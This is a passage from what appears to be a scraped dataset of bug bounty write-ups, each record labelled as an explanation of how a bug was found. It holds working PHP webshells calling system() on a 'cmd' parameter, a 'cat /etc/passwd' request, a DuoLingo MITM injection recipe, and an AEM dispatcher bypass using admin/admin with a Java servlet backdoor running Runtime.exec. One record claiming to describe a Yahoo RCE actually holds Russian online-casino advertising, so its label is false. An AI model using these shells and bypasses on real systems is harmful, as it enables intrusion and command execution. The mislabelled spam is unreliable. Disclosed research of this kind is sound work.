replied. Press enter or click to view image in full size I was like WTF, this must be some kind of joke as i have sent previous reports and they seem to reply just fine. This was a little too much. Also you can see he sent me gif in the word duped which was this. I was really angry at the way he replied, i mean the first line was enough to let me know, there was no need to brag about the money and you need to work harder. I didn’t really know how to respond to this, i thought maybe he’s had a tough day at his job and using this just for fun. I really wanted to get back at him but i let go and just waited for them to fix the issue. A few days pass and its fixed. So i looked to bypass the upload functionality and after a few tries i uploaded the file like xss.svg.jpeg and it worked i got an XSS again. I was happy and thought now is the right time to get back at that guy. So i started writing my report and while i was writing i thought maybe i should try to get RCE by uploading a PHP file. At first i simply uploaded a php file with code <?php phpinfo(); ?> and i got the PHP version page and all the details. Press enter or click to view image in full size This was enough to prove RCE and so i quickly reported and hoping it was not duped this time. Since it was a bypass i just sent it to the same guy to which he replied. Press enter or click to view image in full size I mean what the hell is wrong with this dude. So i contacted their support team and sent all the screenshots of the email showing the way he replied but they didn’t respond. So to prove the guy wrong i uploaded a php file with the code <?php echo \"Shell\";system($_GET['cmd']); ?> and i got a shell. Now i can just visit the image URL and add ?cmd=[command here] to run any command. Also it didn’t require any authentication that means once i uploaded the shell i can just visit the URL of the image and run any commands i want, no need to log in. Press enter or click to view image in full size Press enter or click to view image in full size Press enter or click to view image in full size So after i sent all the screenshots of the RCE i get this. Press enter or click to view image in full size I kinda knew this was gonna happen at some point and so i made a new report and sent it to the security team as it was a critical bug. After a month and a half of waiting they finally replied. Press enter or click to view image in full size I guess that makes for it then. This was one of the weirdest experience i have had in this field. After the incident they removed their bug bounty page from their website and is no longer present. Hope you learned something, if you liked then please share. Follow me on twitter — https://twitter.com/abhishekY495 Thank You. Security Bug Bounty Pentesting Rce -- -- 2 Written by Abhishek 713 followers · 0 following https://bugbountydirectory.com Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/01/rce-vulnerabilite-in-yahoo-subdomain.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/01/rce-vulnerabilite-in-yahoo-subdomain.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://wwws.nightwatchcybersecurity.com/2018/01/04/rce-in-duolingos-tinycards-app-for-android-cve-2017-16905/", "title": "Content Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] | Nightwatch Cybersecurity", "friendly_explanation": "This is a bug bounty writeup from https://wwws.nightwatchcybersecurity.com/2018/01/04/rce-in-duolingos-tinycards-app-for-android-cve-2017-16905/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nContent Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] | Nightwatch Cybersecurity Skip to content Nightwatch Cybersecurity Cybersecurity services and research Menu Home Blog Presentations Tools Contact Home Content Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] Content Injection in DuoLingo’s TinyCards App for Android [CVE-2017-16905] January 4, 2018 April 29, 2019 nightwatchcyber Advisories duolingo , google , tinycards [NOTE ADDED 04/29/2019: The term “RCE” – “Remote Code Execution” in this context is taken from the Google Play Security Reward Program (GPSRP) as per their policy here , even though it is not normally used that way. It specifically refers to the ability to inject and run JavaScript within a WebView-based app. For now, the scope of this program is limited to RCE (remote-code-execution) vulnerabilities and corresponding POCs (Proof of concepts) that work on Android 4.4 devices and higher. This translates to any RCE vulnerability that allows an attacker to run code of their choosing on a user’s device without user knowledge or permission. Examples may include: Attacker gaining full control, meaning code can be downloaded from the network and executed (download and execute arbitrary code, native, Java code etc. Javascript) UI Manipulation to commit a transaction. For example, causing a banking app to make money transfers on behalf of the user without their consent. Opening of webview that may lead to phishing attacks. Opening webview without user input or interaction. ] Summary The TinyCards Android application provided by DuoLingo can be injected with malicious content by an MITM attacker. Because this application is a web-app framed in an Android WebView, this can lead to JavaScript being executed within the app by running JavaScript [which Google calls remote code execution (RCE)]. The root cause is lack of SSL being used on app startup when the initial web content is loaded into the WebView. The vendor has fixed this issue in v1.0 (version code 10) that was released via Google Play Store on November 20th, 2017 and users should install the latest version. MITRE has assigned # CVE-2017-16905 to track this issue. Vulnerability Details TinyCards is a flashcard application for preparing for tests and memorizing vocabulary. It is made by DuoLingo, which provides a platform for learning new languages. While monitoring network traffic of a test device running Android, we observed that during application startup an initial HTTP call is made to a non-HTTPS site, which then redirects to an HTTPS version. Further research into the application revealed that the application is essentially a thin browser wrapper using Android’s WebView around a web application loaded remotely. Because the initial call is done without HTTPS, it is possible for an MITM attacker to intercept this traffic and inject their own content. Since this is a web app, this can result in code execution within the application since all the content is web based. This would be accomplished by injecting and running arbitrary JavaScript. Screenshots of the captured traffic and relevant source code: Steps To Replicate (on Ubuntu 17.10) 1. Install the application on the Android device but do not start it. 2. Install dnsmasq and NGINX on the Linux host: sudo apt-get install dnsmasq nginx 3. Modify the /etc/hosts file to add the following entry to map the domain name to the Linux host: 192.168.1.x tinycards.duolingo.com 4. Configure /etc/dnsmasq.conf file to listen on the IP and restart DNSMASQ listen-address=192.168.1.x sudo /etc/init.d/dnsmasq restart 5. Add a file with malicious content (you may need to use sudo): cd /var/www/html echo powned >index.html 6. Modify the settings on the Android test phone to static, set DNS to point to “192.168.1.x”. AT THIS POINT – Android will resolve DNS against the Linux computer and serve the large servers file 7. Open the app on the Android device and observe injected content. All testing was done on v1.0 (version code 9) of the Android application using a Linux host running Ubuntu v17.10 and Android test device running Android v7. Vendor Response and Mitigation To fix this issue, the vendor has changed the initial URL for web content being loaded within the app to use SSL. The vendor has fixed this issue in v1.0 (version code 10) that was released via Google Play Store on November 20th, 2017 and users should install the latest version. Bounty Information DuoLingo doesn’t currently offer bounties, however, this bug has fulfilled the requirements of Google Play Security Reward Program and a bounty has been paid from that program. References CVE-ID: CVE-2017-16905 HackerOne Reports: 281605 (DuoLingo) and 293444 (Google Play Rewards) Credits We would like to thank the vendor for the quick turnaround and fix for this vulnerability. Text of the advisory written by Yakov Shafranovich. Timeline 2017-10-21: Report opened with the vendor via HackerOne to clarify scope 2017-11-06: Technical details of vulnerability provided to the vendor via HackerOne 2017-11-07: Report triaged and being reviewed by the vendor 2017-11-20: Vendor patched the issue and asked for testing of the fix 2017-11-20: Fix confirmed, communication regarding disclosure 2017-11-28: Report submitted to Google’s Play Rewards program via HackerOne 2017-11-29: Rejection received due to scope, follow-up communication with Google regarding scope 2017-12-04: Follow-up conversation about disclosure with Google and the vendor 2017-12-05: Disclosure requested from DuoLingo via HackerOne 2018-01-04: Public disclosure on HackerOne, and publication of this advisory 2019-04-29: Added clarification for terminology Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Like Loading... Post navigation ← ChromeOS Doesn’t Always Use SSL During Startup [CVE-2017-15397] Research: Auto-detection of Compressed Files in Apple’s macOS → Leave a comment Cancel reply Δ This site uses Akismet to reduce spam. Learn how your comment data is processed. Search Search for: Categories Advisories (67) Opinion (4) Research (44) Tools (4) Uncategorized (2) Recent Posts Additional Vulnerabilities in Log4J Insecure Bootstrap Process in Google’s Cloud SQL Proxy RFC 9116 / “security.txt” Has Been Published GitBleed – Finding Secrets in Mirrored Git Repositories – CVE-2022-24975 Insecure Bootstrap Process in Oracle Cloud CLI Tags adobe airflow amazon Android apache apple arro asus avg aws boozt bounties browsers bsidesdc bsidesde bugcrowd chrome chromebook chromeos cisco conferences content-spoofing crosswalk csrf cve-2019-0221 cve-2019-0232 cve-2019-10320 duolingo eblaster eff facebook firefox fireos github gmail google gps hackerone intel io17 java jdk jenkins jsonp kindle log4j macos messenger microsoft mozilla no-ssl office 365 open-redirect oracle paypal pia pillpack privacy qualcomm routers s3 samsung spectorsoft ssl supplychainattack synack tinycards tomcat united vpn whatsapp wickr windows yandex zoho Subscribe to Blog via Email Enter your email address to subscribe to this blog and receive notifications of new posts by email. Email Address: Subscribe Join 117 other subscribers Blog at WordPress.com. Bugcrowd HackerOne Twitter Comment Reblog Subscribe Subscribed Nightwatch Cybersecurity Join 117 other subscribers Sign me up Already have a WordPress.com account? Log in now. Nightwatch Cybersecurity Subscribe Subscribed Sign up Log in Copy shortlink Report this content View post in Reader Manage subscriptions Collapse this bar Loading Comments... Write a Comment... Email (Required) Name (Required) Website %d"}
{"source_url": "https://medium.com/@smilehackerofficial/how-i-found-rce-but-got-duplicated-ea7b8b010990", "title": "How I found RCE But Got Duplicated | by Meet Sodha | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@smilehackerofficial/how-i-found-rce-but-got-duplicated-ea7b8b010990. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found RCE But Got Duplicated | by Meet Sodha | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found RCE But Got Duplicated Meet Sodha 3 min read · Oct 15, 2019 -- 1 Listen Share Press enter or click to view image in full size So first of All i can not show You the Name Of the Site Because Of security Issue But Let me tell You How Was I am able to bypass the file Upload functionality to Upload a shell to the website. So first I tried Into The edit Profile screen I was trying to find An XSS Because XSS pays a lot , But sadly I can not Find any XSS in every Possible parameter So I Think That Lets upload A shell For that I was checking that The Image is Uploading on the same app or any third party app all other images on that website was on https://victimsite.com/images/static/image.jpg so when i uploaded the simple image on the profile it was on https://victimsite.com/images/users/<ProfilID>/smilehacker.jpg Now the next thing was to try uploading any other extension, but if i try uploading any extension other than JPG, PNG it popup a forbidden error. So its final that there are Restriction of other MIME types. so I think that i need to try GET request containing the filename & mime, in it https://victimsite.com/settings/<id>/avatar?name=test.png&mime=image%2Fpng and the response code of the request was 200 OK simple & The next request was PUT request for file upload to the images directory. https://victimsite.com/users/<id>/testtts.png I tried chaining the content of the PUT request as HTML or TXT but it respond with error code 500 [That sucks…] But later I realized that It was because i forget that the referer header contains the last URL . But then tested it again By changing the name & mime in First GET request as it was added as Referer to the next PUT request and then i changed the content & file type in the PUT request. AND I GOT 200 https://victimsite.com/settings/<id>/avatar?name=smile.html&mime=text%2Fhtml and Following that request i made changes to the PUT request to Upload an HTML file and it was Success. Now I have a Stored XSS using HTML file, I bypassed the Same origin Policies & X-Frame-Options Header and more…… Now i decided to upload a PHP file With My Remote Code.. <?php if(isset($_REQUEST[‘cmd‘])){ echo “<pre>“; $cmd = ($_REQUEST[‘cmd‘]); system($cmd); echo “</pre>“; die; }?> Its simple PHP Backdoor which i found from google TBH.. But when I uploaded PHP code It gave Me 403 status code (Feels Like WTF is Happening). So I think that Lets try Some Other extentions (Was Think That’s The Last try after it I’ll Leave that). And when i Tried php5 , php7 It works As an Magic Target: https://victimsite.com/images/users/<id>/try.phps?cmd=cat+/etc/passwd (MY FIRST RCE) They Fixed this Bug after a week But due to company Policy I can not Show u the Name . THANKS FOR YOUR TIME Regards, Smilehacker PHP Bug Bounty Hacking Bounty Program Tips -- -- 1 Written by Meet Sodha 254 followers · 88 following Knowledge is power! Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@byq/how-to-get-rce-on-aem-instance-without-java-knowledge-a995ceab0a83", "title": "How to get RCE on AEM instance without Java knowledge | by byq | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@byq/how-to-get-rce-on-aem-instance-without-java-knowledge-a995ceab0a83. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow to get RCE on AEM instance without Java knowledge | by byq | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How to get RCE on AEM instance without Java knowledge byq 9 min read · Oct 1, 2019 -- Listen Share Before deep diving into how I was able to perform remote code execution on one of Adobe Experience Manager instances at bug bounty program let me tell you in brief about this huge and complex system. Few years ago Peter Adkins (Darkarnium) found RCE at signout.live.com, so with his permission I give a technical description of the system taken from his write-up . If you are familiar with AEM, you can safely go to Discover section. AEM Overview Press enter or click to view image in full size Adobe Experience Manager (AEM) is an “enterprise grade” content management system sold and maintained by Adobe Systems. The core components of this system run inside of a JVM, with an optional Apache HTTP server module provided for “caching and/or load-balancing”. AEM Architecture Under the hood, “stock” AEM deployment consists of a vast array of open source products and some Adobe brand glue. Rather than the services which comprise AEM being deployed in a “traditional” manner, they are instead implemented as components inside of an Apache Felix based Open Services Gateway initiative ( OSGi ) framework. Press enter or click to view image in full size A view of the AEM internal architecture, taken from the AEM 5.6.1 documentation. The advantage of this system is that these components, known as OSGi “bundles”, can be installed, restarted, or re-configured without the need to restart the OSGi framework or underlying JVM. In addition, this architecture allows for the extension of AEM through the development and installation of custom OSGi bundles. Deployment Topology A “typical” AEM deployment consists of three distinct tiers: Author (runs in a JVM) Publish (runs in a JVM) Dispatch (runs as an Apache HTTP Server module) An example diagram of this style of tiered deployment can be found below: Press enter or click to view image in full size A common three tier deployment, taken from the AEM 5.6.1 documentation. In order to improve the security posture of an AEM installation, these tiers are typically deployed with the Author and Publish tiers protected from the world through network segmentation and/or access controls. The Dispatch tier is generally the only tier “open” to the internet, providing a mechanism to retrieve and cache content from the Publish tier (in a manner not unlike that of a reverse-proxy). Dispatch Filtering As a result of the Dispatch tier pulling data from upstream Publish nodes, the Dispatch module implements a “filtering” mechanism in order to mitigate abuse. This filter is especially important given that nodes in the Publish tier serve both content and administrative resources via the same Apache Sling service. As an example of why this filtering is required, the following URL on the Publish node publish.example.org are able to be accessed without any authentication: https://publish.example.org/etc/reports/diskusage.html This page provides a browsable view of all data in the content repository. However, if accessed via the Dispatch tier — assuming a default Dispatch configuration with an empty cache — the following should be true: https://dispatch.example.org/etc/reports/disusage.html Filtered by the Dispatch tier, with an HTTP 404 served to the requestor. In order to implement these restrictions, the default AEM Dispatch module configuration contains a set of filters which operate in a default “deny” manner: If a resource hasn’t been explicitly allowed inside of a filter block, requests for that resource would be denied. In order to better demonstrate this configuration, an excerpt from an example Dispatch configuration file — taken from the AEM 5.6.1 “security checklist” — has been included below: # only handle the requests in the following acl. default is 'none' # the glob pattern is matched against the first request line /filter { # deny everything and allow specific entries /0001 { /type \"deny\" /glob \"*\" } /0023 { /type \"allow\" /glob \"* /content*\" } ... # enable specific mime types in non-public content directories /0041 { /type \"allow\" /glob \"* *.css *\" } # enable css /0042 { /type \"allow\" /glob \"* *.gif *\" } # enable gifs ... } The end result of this configuration is that the ability to pull Publish tier administrative resources through the Dispatch tier should be prevented. Discover I hope this information is enough to understand key features of AEM. After watching a great presentation “ AEM hacker — approaching Adobe Experience Manager webapps in bug bounty programs ” by Mikhail Egorov ( 0ang3el ) at Bugcrowd Level Up 0x03 event where he presented tools for AEM security testing and exploitation I decided to make some practice. I chose one of the bug bounty program, which contains several AEM instance in scope and began testing. Due to the non-disclosure policy of the program I will only use example.org domain. First of all I launched aem_hacker.py — a script which performs dozens of checks to find security misconfigurations. After a few minutes I got a long listing of potential issues which meant that this instance had some problems with security. One of the most interesting findings for me was exposed Felix Console, which in some cases can lead to RCE. Press enter or click to view image in full size The Web console in AEM is based on the Apache Felix Web Management Console. Apache Felix is a community effort to implement the OSGi R4 Service Platform, which includes the OSGi framework and standard services. The Web console offers a selection of tabs for maintaining the OSGi bundles, including: Configuration: used for configuring the OSGi bundles, and is therefore the underlying mechanism for configuring AEM system parameters Bundles: used for installing bundles Components: used for controlling the status of components required for AEM If you try to send following request: GET /system/console/bundles HTTP/1.1 Host: example.org … in most cases you will get the following response: HTTP/1.1 404 Not Found To bypass dispatcher I used request: GET /system/console/bundles ?.css HTTP/1.1 Host: example.org … and get the following response: HTTP/1.1 403 Forbidden Actually, such behavior proved that instance was vulnerable to CVE-2016–0957 . So, the next step I needed to pass through was some kind of authorization. Generally AEM accept HTTP Basic Authorization header. But, what about credentials? Let’s try default pair admin/admin . And … we are in. Press enter or click to view image in full size Exposed Web Console at signout.live.com from Darkarnium write-up Since this was my first time seeing Web Console I spent some time just exploring it. As you can see on the screenshot above it contains a lot of juicy info and functionality. But let’s return to OSGi bundle and achieve desired RCE. Exploit Luckily, 0ang3el have prepared aem-rce-bundle — which contains pre-build bundle, source code of this bundle and some instructions. At https://example.org/system/console/status-productinfo I checked installed AEM version and got Adobe Experience Manager (6.1.0.x) (available since May 28, 2015). So, this meant that I couldn’t use pre-build bundle, because it requires at least version 6.2. If you don’t have ready exploit, try to build it yourself. As said in repository’s instruction for AEM version 6.0 or newer I can use following Maven command: mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate \\ -DarchetypeGroupId=com.adobe.granite.archetypes \\ -DarchetypeArtifactId=aem-project-archetype \\ -DarchetypeVersion=SELECT_FROM_TABLE \\ -DarchetypeCatalog=https://repo.adobe.com/nexus/content/groups/public/ From the table I chose Archetype version 10. At that moment I didn’t even have Maven installed on my machine, so it required some time to install and configure it. After Maven was ready I ran final command: mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate \\ -DarchetypeGroupId=com.adobe.granite.archetypes \\ -DarchetypeArtifactId=aem-project-archetype \\ -DarchetypeVersion=10 \\ -DarchetypeCatalog=https://repo.adobe.com/nexus/content/groups/public/ And this was the moment when the real difficulties arose. As you probably have already understood, it was my first experience working with Maven and when it started to ask for additional info, such as groupId, artifactId, package, artifactName etc, I got stuck. However after some time spending to research of structure and source codes of pre-build bundle I found correct variant: Define value for property 'groupId': : aem.hacks Define value for property 'artifactId': : rce.bundle Define value for property 'version': 1.0-SNAPSHOT: : Define value for property 'package': aem.hacks: : Define value for property 'appsFolderName': : aem.hacks Define value for property 'artifactName': : aem.hacks Define value for property 'componentGroupName': : aem Define value for property 'contentFolderName': : aem.hacks Define value for property 'cssId': : aem Define value for property 'packageGroup': : aem.hacks Define value for property 'siteName': : aem.hacks After creation of the project I deleted all unnecessary directories and project structure looked like this: └── rce.bundle ├── README.md ├── core │ ├── pom.xml │ └── src │ └── main │ └── java │ └── aem │ └── hacks │ └── core │ ├── package-info.java │ └── servlets │ └── SimpleServlet.java └── pom.xml In rce.bundle/pom.xml I left only core module: <modules> <module>core</module> </modules> After that I modified servlet from aem-rce-bundle (with my practically zero Java knowledge), because it didn’t work for me. Final variant of SimpleServlet.java (it’s probably awful, but c’mon): package aem.hacks.core.servlets; import org.apache.felix.scr.annotations.sling.SlingServlet; import org.apache.sling.api.SlingHttpServletRequest; import org.apache.sling.api.SlingHttpServletResponse; import org.apache.sling.api.resource.Resource; import org.apache.sling.api.servlets.SlingAllMethodsServlet; import org.apache.sling.api.servlets.SlingSafeMethodsServlet; import javax.servlet.ServletException; import java.io.IOException; import java.io.*; @SuppressWarnings (\"serial\") @SlingServlet (resourceTypes = \"aem.hacks/structure/page\", paths = \" /bin/backdoor \") public class SimpleServlet extends SlingSafeMethodsServlet { @Override protected void doGet(final SlingHttpServletRequest req, final SlingHttpServletResponse resp) throws ServletException, IOException { final Resource resource = req.getResource(); Process proc = Runtime.getRuntime().exec(req.getParameter(\"cmd\")); BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream())); StringBuilder sb = new StringBuilder(); String s = null; while ((s = stdInput.readLine()) != null) { sb.append(s + \"\\n\"); } String output = sb.toString(); resp.setContentType(\"text/plain\"); resp.getWriter().write(output); } } After everything was ready I launched command to build and package bundle: mvn package .. and got red: ... [INFO] BUILD FAILURE ... Here I tried to make some changes to Maven command, project structure, servlet source code, but every time I got BUILD FAILURE. And maybe it could be the standstill, but one of my colleagues (PHP expert) advised me to check my version of Java. It turned out that I built bundle using Java 11 and after switching to Java 8 I finally got BUILD SUCCESS. Here is a command which helped me: update-alternatives --config java My bundle was ready and located in rce.bundle/core/target. I 